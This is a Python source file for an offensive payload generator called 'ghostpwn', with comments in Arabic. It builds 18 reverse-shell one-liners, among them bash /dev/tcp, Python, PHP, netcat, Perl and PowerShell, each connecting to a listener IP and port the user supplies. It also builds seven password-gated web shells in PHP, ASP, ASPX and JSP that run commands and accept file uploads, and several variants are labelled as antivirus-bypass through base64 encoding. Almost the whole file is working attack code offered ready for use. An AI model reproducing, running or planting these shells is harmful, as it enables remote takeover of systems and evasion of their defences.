#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Payload Generator (Zero-Dependency)
توليد reverse shells و web shells بدون مكتبات خارجية
"""
import base64
import json
import os
import sys
from typing import Dict, List


# ============================ Reverse Shells ============================
def bash_reverse_shell(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def bash_alt_reverse_shell(ip: str, port: int) -> str:
    return f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&1 >&5; done"

def python_reverse_shell(ip: str, port: int) -> str:
    return (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/sh\",\"-i\"])'"
    )

def python_pty_reverse_shell(ip: str, port: int) -> str:
    return (
        f"python3 -c 'import pty,socket,os,subprocess;"
        f"s=socket.socket();s.connect((\"{ip}\",{port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"pty.spawn(\"/bin/bash\")'"
    )

def php_reverse_shell(ip: str, port: int) -> str:
    return (
        f"php -r '$sock=fsockopen(\"{ip}\",{port});"
        f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    )

def perl_reverse_shell(ip: str, port: int) -> str:
    return (
        f"perl -e 'use Socket;"
        f"my $ip=\"{ip}\";my $port={port};"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"if(connect(S,sockaddr_in($port,inet_aton($ip)))){{"
        f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"/bin/sh -i\");}};'"
    )

def ruby_reverse_shell(ip: str, port: int) -> str:
    return (
        f"ruby -rsocket -e '"
        f"exit if fork;"
        f"c=TCPSocket.new(\"{ip}\",\"{port}\");"
        f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}} end'"
    )

def netcat_reverse_shell(ip: str, port: int) -> str:
    return f"nc -e /bin/sh {ip} {port}"

def netcat_mkfifo_reverse_shell(ip: str, port: int) -> str:
    return (
        f"rm /tmp/f;mkfifo /tmp/f;"
        f"cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    )

def ncat_ssl_reverse_shell(ip: str, port: int) -> str:
    return f"ncat --ssl {ip} {port} -e /bin/sh"

def powershell_reverse_shell(ip: str, port: int) -> str:
    return (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass "
        f"-Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()}};"
        f"$client.Close()\""
    )

def powershell_b64_reverse_shell(ip: str, port: int) -> str:
    """PowerShell مع base64 encoding (AV bypass)"""
    ps_script = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()}};"
        f"$client.Close()"
    )
    encoded = base64.b64encode(ps_script.encode("utf-16le")).decode("utf-8")
    return f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

def nodejs_reverse_shell(ip: str, port: int) -> str:
    return (
        f"node -e '"
        f"const net = require(\"net\");"
        f"const cp = require(\"child_process\");"
        f'const sh = cp.spawn("/bin/sh", []);'
        f'const client = new net.Socket();'
        f'client.connect({port}, "{ip}", function(){{'
        f'client.pipe(sh.stdin);'
        f'sh.stdout.pipe(client);'
        f'sh.stderr.pipe(client);'
        f"}});'"
    )

def lua_reverse_shell(ip: str, port: int) -> str:
    return (
        f"lua -e '"
        f"require(\"socket\");require(\"os\");"
        f't=socket.tcp();'
        f't:connect("{ip}","{port}");'
        f'os.execute("/bin/sh -i <&3 >&3 2>&3");'
        f"'"
    )

def awk_reverse_shell(ip: str, port: int) -> str:
    return (
        f"awk 'BEGIN {{"
        f"s = \"/inet/tcp/0/{ip}/{port}\";"
        f"while(1) {{ printf \"shell> \" |& s; s |& getline c;"
        f"if(c == \"exit\") exit; "
        f"while((c |& getline) > 0) print $0 |& s; close(c);"
        f"}}}}'"
    )

def java_reverse_shell(ip: str, port: int) -> str:
    return (
        f"r = Runtime.getRuntime();"
        f'p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | '
        f'while read line; do \\$line 2>&1 >&5; done"] as String[])'
    )

def telnet_reverse_shell(ip: str, port: int) -> str:
    return (
        f"mknod backpipe p && "
        f"telnet {ip} {port} 0<backpipe | /bin/bash 1>backpipe"
    )

def xterm_reverse_shell(ip: str, port: int) -> str:
    return f"xterm -display {ip}:{port}"


REVERSE_SHELLS = {
    "bash":         ("Bash /dev/tcp",                  bash_reverse_shell),
    "bash-alt":     ("Bash alternative",                bash_alt_reverse_shell),
    "python":       ("Python 3",                        python_reverse_shell),
    "python-pty":   ("Python 3 with PTY (interactive)", python_pty_reverse_shell),
    "php":          ("PHP",                             php_reverse_shell),
    "perl":         ("Perl",                            perl_reverse_shell),
    "ruby":         ("Ruby",                            ruby_reverse_shell),
    "nc":           ("Netcat (-e)",                     netcat_reverse_shell),
    "nc-mkfifo":    ("Netcat (mkfifo - بدون -e)",       netcat_mkfifo_reverse_shell),
    "ncat-ssl":     ("Ncat (SSL)",                      ncat_ssl_reverse_shell),
    "powershell":   ("PowerShell",                      powershell_reverse_shell),
    "powershell-b64": ("PowerShell (base64, AV bypass)", powershell_b64_reverse_shell),
    "nodejs":       ("Node.js",                         nodejs_reverse_shell),
    "lua":          ("Lua",                             lua_reverse_shell),
    "awk":          ("Awk",                             awk_reverse_shell),
    "java":         ("Java",                            java_reverse_shell),
    "telnet":       ("Telnet",                          telnet_reverse_shell),
    "xterm":        ("Xterm",                           xterm_reverse_shell),
}


# ============================ Web Shells ============================
def php_webshell(password: str = "ghost") -> str:
    """PHP web shell كامل مع upload"""
    return f"""<?php
if(isset($_POST['{password}']) || isset($_GET['{password}'])){{
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : $_GET['cmd'];
    if($cmd){{
        echo "<pre>".shell_exec($cmd)."</pre>";
    }}
    if(isset($_FILES['file'])){{
        $target = isset($_POST['path']) ? $_POST['path'] : './'.basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){{
            echo "File uploaded: ".$target;
        }}
    }}
}}
echo "<form method='POST' enctype='multipart/form-data'>".
     "Cmd: <input name='cmd' style='width:80%'><br>".
     "File: <input type='file' name='file'><br>".
     "Path: <input name='path' value='./'><br>".
     "<input type='submit' name='{password}' value='Execute'>".
     "</form>";
?>
"""


def php_tiny_webshell(password: str = "cmd") -> str:
    """PHP one-liner"""
    return f"<?php if($_POST['{password}']){{system($_POST['{password}']);}}?>"


def php_eval_webshell(password: str = "ghost") -> str:
    """PHP eval shell"""
    return f"""<?php
@eval($_POST['{password}']);
?>
"""


def php_bypass_webshell(password: str = "ghost") -> str:
    """PHP shell مع AV bypass (base64)"""
    encoded = base64.b64encode(b"system($_POST['cmd']);").decode()
    return f"""<?php
if(isset($_POST['{password}'])){{
    $f=base64_decode("{encoded}");
    eval($f);
}}
?>
"""


def asp_webshell(password: str = "ghost") -> str:
    """ASP web shell"""
    return f"""<%
If Request("{password}")<>"" Then
    Dim cmd, shell, output
    cmd = Request("cmd")
    Set shell = Server.CreateObject("WScript.Shell")
    Set output = shell.Exec("%comspec% /c " & cmd)
    Response.Write("<pre>" & output.StdOut.ReadAll & "</pre>")
End If
%>
<form method='POST'>
Cmd: <input name='cmd' style='width:80%'>
<input type='submit' name='{password}' value='Execute'>
</form>
"""


def aspx_webshell(password: str = "ghost") -> str:
    """ASPX web shell"""
    return f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void ExecuteCmd(object sender, EventArgs e) {{
    if(Request["{password}"] != null) {{
        Process p = new Process();
        p.StartInfo.FileName = "/bin/sh";
        p.StartInfo.Arguments = "-c \\"" + cmd.Text + "\\"";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        output.InnerHtml = "<pre>" + p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd() + "</pre>";
    }}
}}
</script>
<form runat="server">
<asp:TextBox id="cmd" runat="server" Width="80%"/>
<asp:Button OnClick="ExecuteCmd" Text="Execute" runat="server"/>
<div id="output" runat="server"/>
</form>
"""


def jsp_webshell(password: str = "ghost") -> str:
    """JSP web shell"""
    return f"""<%@ page import="java.io.*" %>
<%
if(request.getParameter("{password}") != null){{
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",cmd}});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null){{
        out.println(line);
    }}
    out.println("</pre>");
}}
%>
<form method='GET'>
Cmd: <input name='cmd' style='width:80%'>
<input type='submit' name='{password}' value='Execute'>
</form>
"""


WEB_SHELLS = {
    "php":          ("PHP Web Shell",                php_webshell),
    "php-tiny":     ("PHP Tiny (one-liner)",         php_tiny_webshell),
    "php-eval":     ("PHP eval shell",               php_eval_webshell),
    "php-bypass":   ("PHP AV bypass (base64)",       php_bypass_webshell),
    "asp":          ("ASP Web Shell",                asp_webshell),
    "aspx":         ("ASPX Web Shell (.NET)",        aspx_webshell),
    "jsp":          ("JSP Web Shell",                jsp_webshell),
}


# ============================ Main ============================
def list_reverse_shells():
    """عرض كل الـ reverse shells"""
    print("\n📋 الـ Reverse Shells المتاحة:")
    print("=" * 60)
    for key, (desc, _) in REVERSE_SHELLS.items():
        print(f"  {key:18s} - {desc}")


def list_web_shells():
    """عرض كل الـ web shells"""
    print("\n📋 الـ Web Shells المتاحة:")
    print("=" * 60)
    for key, (desc, _) in WEB_SHELLS.items():
        print(f"  {key:18s} - {desc}")


def generate_reverse_shell(shell_type: str, ip: str, port: int) -> str:
    """توليد reverse shell"""
    if shell_type in REVERSE_SHELLS:
        return REVERSE_SHELLS[shell_type][1](ip, port)
    return None


def generate_web_shell(shell_type: str, password: str = "ghost") -> str:
    """توليد web shell"""
    if shell_type in WEB_SHELLS:
        return WEB_SHELLS[shell_type][1](password)
    return None


def generate_all_reverse_shells(ip: str, port: int, output_file: str) -> str:
    """توليد كل الـ shells في ملف واحد"""
    content = f"#!/bin/bash\n# ghostpwn - Reverse Shells for {ip}:{port}\n\n"
    for key, (desc, gen_func) in REVERSE_SHELLS.items():
        content += f"# === {desc} ({key}) ===\n"
        content += gen_func(ip, port) + "\n\n"

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(content)
    return output_file


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Payload Generator")
    parser.add_argument("--list-reverse", action="store_true", help="List reverse shells")
    parser.add_argument("--list-web", action="store_true", help="List web shells")
    parser.add_argument("--reverse-type", help="Reverse shell type")
    parser.add_argument("--web-type", help="Web shell type")
    parser.add_argument("--ip", help="Listener IP")
    parser.add_argument("--port", type=int, help="Listener port")
    parser.add_argument("--password", default="ghost", help="Web shell password")
    parser.add_argument("--all-reverse", action="store_true", help="Generate all reverse shells")
    parser.add_argument("--output", help="Output file")
    args = parser.parse_args()

    if args.list_reverse:
        list_reverse_shells()
    elif args.list_web:
        list_web_shells()
    elif args.reverse_type and args.ip and args.port:
        shell = generate_reverse_shell(args.reverse_type, args.ip, args.port)
        if shell:
            print(shell)
            print(f"\n[*] Listener: nc -lvnp {args.port}", file=sys.stderr)
        else:
            print(f"[!] Unknown type: {args.reverse_type}", file=sys.stderr)
    elif args.web_type:
        shell = generate_web_shell(args.web_type, args.password)
        if shell:
            if args.output:
                with open(args.output, "w") as f:
                    f.write(shell)
                print(f"[✓] Saved: {args.output}", file=sys.stderr)
            else:
                print(shell)
    elif args.all_reverse and args.ip and args.port:
        output = args.output or f"shells_{args.ip}_{args.port}.txt"
        generate_all_reverse_shells(args.ip, args.port, output)
        print(f"[✓] All shells saved: {output}", file=sys.stderr)
    else:
        parser.print_help()
